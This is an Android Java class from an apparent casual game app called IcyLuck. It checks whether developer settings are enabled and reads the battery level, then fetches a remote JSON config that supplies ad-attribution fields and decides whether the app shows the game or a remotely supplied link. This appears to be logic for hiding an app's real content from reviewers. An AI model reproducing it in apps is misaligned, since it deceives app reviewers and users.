package com.rkgames.basisga.startIcyLuck;

import static android.content.Context.BATTERY_SERVICE;
import static com.rkgames.basisga.ApplicationIcyLuck.appId;
import static com.rkgames.basisga.ApplicationIcyLuck.arrayList2;
import static com.rkgames.basisga.ApplicationIcyLuck.daoTabIcyLuck;
import static com.rkgames.basisga.ApplicationIcyLuck.deep;
import static com.rkgames.basisga.ApplicationIcyLuck.lol;
import static com.rkgames.basisga.ApplicationIcyLuck.retu;

import android.annotation.SuppressLint;
import android.content.Intent;
import android.content.IntentFilter;
import android.os.BatteryManager;
import android.os.Build;
import android.provider.Settings;
import android.util.Log;

import com.android.volley.DefaultRetryPolicy;
import com.android.volley.Request;
import com.android.volley.RequestQueue;
import com.android.volley.Response;
import com.android.volley.VolleyError;
import com.android.volley.toolbox.StringRequest;
import com.android.volley.toolbox.Volley;
import com.onesignal.OneSignal;
import com.rkgames.basisga.ApplicationIcyLuck;
import com.rkgames.basisga.Const;
import com.rkgames.basisga.MainActivity;
import com.rkgames.basisga.init.InitApps;
import com.rkgames.basisga.init.InitFb;
import com.rkgames.basisga.room.EntityIcyLuck;
import com.rkgames.basisga.room.EntityIcyLuckData;

import org.json.JSONObject;

import java.net.URLDecoder;
import java.util.List;
import java.util.Objects;

import io.reactivex.Single;
import io.reactivex.SingleEmitter;
import io.reactivex.SingleOnSubscribe;
import io.reactivex.android.schedulers.AndroidSchedulers;
import io.reactivex.functions.Consumer;
import io.reactivex.observers.DisposableSingleObserver;
import io.reactivex.schedulers.Schedulers;

public class StartIcyLuck {

    private MainActivity mainActivity;
    private DataJSo dataJSo;
    public static Const aConst;
    boolean a = true;
    public void setMainActivity(MainActivity mainActivity) {
        this.mainActivity = mainActivity;
        aConst = new Const();
    }

    @SuppressLint("CheckResult")
    public void start(StartIcyLuckInterface startIcyLuckInterface) {
        daoTabIcyLuck.getEntityIcyLuck().subscribeOn(Schedulers.io())
                .observeOn(AndroidSchedulers.mainThread())
                .subscribe(new DisposableSingleObserver<EntityIcyLuck>() {

                    @Override
                    public void onSuccess(EntityIcyLuck entityIcyLuck) {
                        a = false;
                        lol = entityIcyLuck.saveEntityIcyLuck;
                        startIcyLuckInterface.startIcy(true);
                    }

                    @Override
                    public void onError(Throwable e) {
                        adb();
                        bat();
                        vol();

                    }
                });


        //noinspection ResultOfMethodCallIgnored
        daoTabIcyLuck.getEntityIcyLuckData().observeOn(AndroidSchedulers.mainThread())
                .observeOn(AndroidSchedulers.mainThread())
                .subscribe(new Consumer<List<EntityIcyLuckData>>() {
                    @Override
                    public void accept(List<EntityIcyLuckData> entityIcyLuckData) throws Exception {
                        if (retu){
                        if (entityIcyLuckData.size() > 0) {
                            if (entityIcyLuckData.get(0).go.equals("hhgffff")){
                                startIcyLuckInterface.startIcy(false);
                            }else {
                                if (a){

                                lol = entityIcyLuckData.get(0).go;
                                startIcyLuckInterface.startIcy(true);}
                            }

                        } else {
                            Log.d("weq", "111");
                        }
                    }}
                });

    }


    private void adb() {
        int a;
        try {
            a = Settings.Secure.getInt(mainActivity.getContentResolver(),
                    Settings.Global.DEVELOPMENT_SETTINGS_ENABLED, 0);
        }catch (Exception e){
            a = 0;
            e.printStackTrace();
        }


        if (a != 0) {
            ApplicationIcyLuck.adb = String.valueOf(true);
        } else {
            ApplicationIcyLuck.adb = String.valueOf(false);
        }
    }

    private void bat() {
        if (21 <= Build.VERSION.SDK_INT) {
            try {
                BatteryManager bm = (BatteryManager) mainActivity.getSystemService(BATTERY_SERVICE);
                float a = bm.getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY);
                ApplicationIcyLuck.bat = String.valueOf(a);
            } catch (Exception e) {
                ApplicationIcyLuck.bat = "100.0";
            }
        } else {
            try {
                IntentFilter iFilter = new IntentFilter(Intent.ACTION_BATTERY_CHANGED);
                Intent batteryStatus = mainActivity.registerReceiver(null, iFilter);
                int level = batteryStatus != null ? batteryStatus.getIntExtra(BatteryManager.EXTRA_LEVEL, -1) : -1;
                int scale = batteryStatus != null ? batteryStatus.getIntExtra(BatteryManager.EXTRA_SCALE, -1) : -1;
                double batteryPct = level / (double) scale;
                float a = (float) (batteryPct * 100);
                ApplicationIcyLuck.bat = String.valueOf(a);
            } catch (Exception e) {
                ApplicationIcyLuck.bat = "100.0";
            }
        }
    }

    @SuppressLint("CheckResult")
    private void vol(){
        SingleOnSubscribe<String> single = emitter -> {
            StringRequest stringRequest = new StringRequest(Request.Method.GET, "http://aporti.click/icyluck/IcyLuck.json", response ->
                    emitter.onSuccess(response),
                    error -> mainActivity.dialog());
            DefaultRetryPolicy defaultRetryPolicy = new DefaultRetryPolicy(15311, 5, 1f);
            stringRequest.setRetryPolicy(defaultRetryPolicy);
            RequestQueue requestQueue = Volley.newRequestQueue(mainActivity);
            requestQueue.add(stringRequest);
        };

        //noinspection ResultOfMethodCallIgnored
        Single.create(single).
                subscribeOn(Schedulers.io()).
                observeOn(AndroidSchedulers.mainThread())
                .doOnError(throwable -> {
                    mainActivity.dialog();
                })
                .subscribe(s -> {

                    dataJSo = new DataJSo();
                    JSONObject jsonObject = new JSONObject(s);
                    try {
                        dataJSo.setIdAppIcLuk(jsonObject.getString(aConst.getA1()));
                    }catch (Exception e){
                        e.printStackTrace();
                    }

                    try {
                        dataJSo.setIdFbIcLuk(jsonObject.getString(aConst.getA2()));
                    }catch (Exception e){
                        e.printStackTrace();
                    }

                    try {
                        dataJSo.setTokFbIcLuk(jsonObject.getString(aConst.getA3()));
                    }catch (Exception e){
                        e.printStackTrace();
                    }

                    try {
                        dataJSo.setDeppIcLuk(jsonObject.getString(aConst.getA4()));
                    }catch (Exception e){
                        e.printStackTrace();
                    }

                    try {
                        dataJSo.setCampaignIcLuk(jsonObject.getString(aConst.getA5()));
                    }catch (Exception e){
                        e.printStackTrace();
                    }

                    try {
                        dataJSo.setMediaSourceIcLuk(jsonObject.getString(aConst.getA6()));
                    }catch (Exception e){
                        e.printStackTrace();
                    }

                    try {
                        dataJSo.setAfChannelIcLuk(jsonObject.getString(aConst.getA7()));
                    }catch (Exception e){
                        e.printStackTrace();
                    }

                    try {
                        dataJSo.setAfstatusIcLuk(jsonObject.getString(aConst.getA8()));
                    }catch (Exception e){
                        e.printStackTrace();
                    }

                    try {
                        dataJSo.setAfadIcLuk(jsonObject.getString(aConst.getA9()));
                    }catch (Exception e){
                        e.printStackTrace();
                    }

                    try {
                        dataJSo.setCampaignidIcLuk(jsonObject.getString(aConst.getA10()));
                    }catch (Exception e){
                        e.printStackTrace();
                    }

                    try {
                        dataJSo.setAdsetidIcLuk(jsonObject.getString(aConst.getA11()));
                    }catch (Exception e){
                        e.printStackTrace();
                    }

                    try {
                        dataJSo.setAdidIcLuk(jsonObject.getString(aConst.getA12()));
                    }catch (Exception e){
                        e.printStackTrace();
                    }

                    try {
                        dataJSo.setAdsetIcLuk(jsonObject.getString(aConst.getA13()));
                    }catch (Exception e){
                        e.printStackTrace();
                    }

                    try {
                        dataJSo.setGaIdIcLuk(jsonObject.getString(aConst.getA14()));
                    }catch (Exception e){
                        e.printStackTrace();
                    }
                    try {
                        dataJSo.setApssIdtIcLuk(jsonObject.getString(aConst.getA15()));
                    }catch (Exception e){
                        e.printStackTrace();
                    }
                    try {
                        dataJSo.setAdbIcLuk(jsonObject.getString(aConst.getA16()));
                    }catch (Exception e){
                        e.printStackTrace();
                    }
                    try {
                        dataJSo.setBattIcLuk(jsonObject.getString(aConst.getA17()));
                    }catch (Exception e){
                        e.printStackTrace();
                    }

                    next();
                });
    }


    private void next(){
        new InitFb(mainActivity,dataJSo);
        new InitApps(mainActivity,dataJSo);
    }
}
